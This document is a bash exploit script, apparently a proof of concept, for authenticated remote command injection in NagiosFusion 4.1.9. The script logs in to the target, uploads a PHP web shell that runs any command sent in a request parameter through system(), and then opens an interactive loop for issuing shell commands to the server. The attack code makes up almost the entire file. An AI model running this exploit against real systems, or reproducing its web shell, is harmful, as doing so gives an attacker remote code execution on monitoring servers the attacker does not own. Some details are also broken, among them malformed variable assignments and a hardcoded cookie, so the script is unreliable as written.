#!/bin/bash
#VAR

RHOST=$1
ssl=$2
login = $3
password = $4

help()
{
    echo "[*] HELP :"
    echo "[-] You must specify TARGET_IP, SSL mode : true/false, USERNAME, PASSWORD"
    echo "Exemple : ./exploit.sh 192.168.0.11 false nagiosadmin admin"
}
banner()
{
echo "                 ,*-."
echo '                 |  |'
echo '             ,.  |  |'
echo '             | |_|  | ,.'
echo '             `---.  |_| |'
echo '                 |  .--`'
echo "                 |  |"
echo "                 |  |"
echo ""
echo " ! DO NOT USE IF YOU DONT HAVE PERSMISSION !"
echo ""
echo "         NagiosFusion 4.1.9"
echo ""
echo "            Authentified"
echo "      Remote Commande Injection"
echo "                 BY"
echo "             ArianeBlow"
echo "Oops ... It's not a vulnerability, its just a cool fonction ... Or not ..."
}
banner

if [ -z "$1" ]; then
    help
fi
if [ -z "$2" ]; then
    help
fi
if [ $(echo $2) = true ]; then
    ssl=https
else
    ssl=http
fi
if [ -z "$3" ]; then
    help
fi
if [ -z "$4" ]; then
    help
fi
echo "target $ssl://$RHOST"
sleep 5
#authent
echo "[-] Getting cookie"
cookie=$(curl -i -s -k -c --keepalive-time 60 -X $'POST' \
    -H $"Host: $RHOST" -H $'Content-Length: 141' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $"Origin: $ssl://$RHOST" -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $"Referer: $ssl://$RHOST/nagiosfusion/login.php?redirect=/nagiosfusion/index.php%3F&noauth=1" -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7' -H $'Connection: close' \
    --data-binary $"page=auth&pageopt=login&username=$login&password=$password&loginButton=&nsp=52cfbe84b12c95a3ae94875fa7aebf71f4a34ddc9a6a623d5f562fb3286e1726" \
    $"$ssl://$RHOST/nagiosfusion/login.php" | grep nagiosfusion | cut -d "=" -f 2 | cut -d ";" -f 1) &
#need add echec condition
echo "[+] cookie set as $cookie"

#sending webshell
curl -i -s -k -X $'POST' \
    -H $"Host: $RHOST" -H $'Content-Length: 723' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $"Origin: $ssl://$RHOST" -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1JDl0g9yIhBBRYRv' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $"Referer: $ssl://$RHOST/nagiosfusion/admin/dashlets.php" -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7' -H $'Connection: close' \
    -b $"nagiosfusion=9g2g8eh7tcjijondslhupd0s56" \
    --data-binary $'------WebKitFormBoundary1JDl0g9yIhBBRYRv\x0d\x0aContent-Disposition: form-data; name=\"upload\"\x0d\x0a\x0d\x0a1\x0d\x0a------WebKitFormBoundary1JDl0g9yIhBBRYRv\x0d\x0aContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\x0d\x0a\x0d\x0a1000000\x0d\x0a------WebKitFormBoundary1JDl0g9yIhBBRYRv\x0d\x0aContent-Disposition: form-data; name=\"uploadedfile\"; filename=\"webshell.php\"\x0d\x0aContent-Type: application/x-php\x0d\x0a\x0d\x0a<?php\x0aif(isset($_REQUEST[\'powned\'])){\x0a        echo \"<pre>\";\x0a        $powned = ($_REQUEST[\'powned\']);\x0a        system($powned);\x0a        echo \"</pre>\";\x0a        die;\x0a}\x0a?>\x0a\x0d\x0a------WebKitFormBoundary1JDl0g9yIhBBRYRv\x0d\x0aContent-Disposition: form-data; name=\"nsp\"\x0d\x0a\x0d\x0ad8ea7ccd0006b1b80aa76a6b793fe8a0f0157df9e024c881a87a8eef79f34a0d\x0d\x0a------WebKitFormBoundary1JDl0g9yIhBBRYRv--\x0d\x0a' \
    $"$ssl://$RHOST/nagiosfusion/admin/dashlets.php"

while :
do
    echo ""
    echo -n "Web_Shell $ "
    read cmd
    curl $ssl://$RHOST/nagiosfusion/login.php?powned=$cmd
done
